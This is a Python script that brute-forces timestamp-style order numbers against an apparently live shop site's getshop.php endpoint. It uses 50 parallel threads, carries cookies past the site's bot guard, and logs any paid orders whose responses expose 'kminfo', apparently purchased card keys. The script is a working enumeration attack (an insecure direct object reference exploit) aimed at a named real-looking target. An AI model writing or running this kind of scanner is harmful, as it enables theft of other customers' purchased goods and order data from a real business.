#!/usr/bin/env python3
"""getshop 已付款/kminfo 扫描 — 近30天稀疏+近3天加密."""
from __future__ import annotations

import concurrent.futures
import json
import subprocess
import sys
import time
from datetime import datetime, timedelta
from pathlib import Path

BASE = "https://yujuqq.top/shop"
OUT = Path(f"/tmp/yujuqq_gs_{int(time.time())}")
OUT.mkdir(exist_ok=True)
CK = str(OUT / "ck.jar")
SKIP_MSG = {"未付款", "No trade_no!"}
GUARD_MARK = "_guard/html.js"


def is_guard(body: str) -> bool:
    return GUARD_MARK in body or len(body) < 80 and "slider" in body


def warmup() -> None:
    subprocess.run(
        ["curl", "-sk", "-m", "20", "-c", CK, "-b", CK, "-A", "Mozilla/5.0",
         "-H", "Accept-Language: zh-CN", f"{BASE}/", "-o", "/dev/null"],
        check=False,
    )


def gen_tradenos() -> list[str]:
    out: list[str] = []
    for day_offset in range(30):
        step = 5 if day_offset < 3 else 25
        suf_step = 10 if day_offset < 3 else 50
        d = datetime.now() - timedelta(days=day_offset)
        prefix = d.strftime("%Y%m%d")
        for h in range(24):
            for m in range(0, 60, step):
                for s in (0, 15, 30, 45):
                    for suf in range(0, 1000, suf_step):
                        tn = f"{prefix}{h:02d}{m:02d}{s:02d}{suf:03d}"
                        if len(tn) == 17:
                            out.append(tn)
    return list(dict.fromkeys(out))


def probe(tn: str) -> tuple[str, str] | None:
    r = subprocess.run(
        ["curl", "-sk", "-m", "8", "-b", CK, f"{BASE}/other/getshop.php?trade_no={tn}"],
        capture_output=True, text=True,
    )
    body = r.stdout.strip()
    if not body or is_guard(body) or "未付款" in body or "No trade_no" in body:
        return None
    if "kminfo" in body or '"code":0' in body:
        return tn, body
    try:
        j = json.loads(body)
        if j.get("msg") not in SKIP_MSG:
            return tn, body
    except json.JSONDecodeError:
        return tn, body
    return None


def main() -> int:
    warmup()
    tns = gen_tradenos()
    log = OUT / "log.txt"
    hits: list[dict] = []
    print(f"getshop scan n={len(tns)} out={OUT}", flush=True)

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
        for i, res in enumerate(ex.map(probe, tns, chunksize=80)):
            if res:
                tn, body = res
                row = {"trade_no": tn, "body": body[:1000]}
                hits.append(row)
                log.write_text(log.read_text() + f"HIT {tn} {body[:200]}\n" if log.exists() else f"HIT {tn} {body[:200]}\n")
                print(f"HIT {tn} => {body[:250]}", flush=True)
            if i and i % 5000 == 0:
                print(f"progress {i}/{len(tns)} hits={len(hits)}", flush=True)

    (OUT / "hits.json").write_text(json.dumps(hits, ensure_ascii=False, indent=2))
    print(f"DONE hits={len(hits)}", flush=True)
    return 0 if hits else 2


if __name__ == "__main__":
    sys.exit(main())
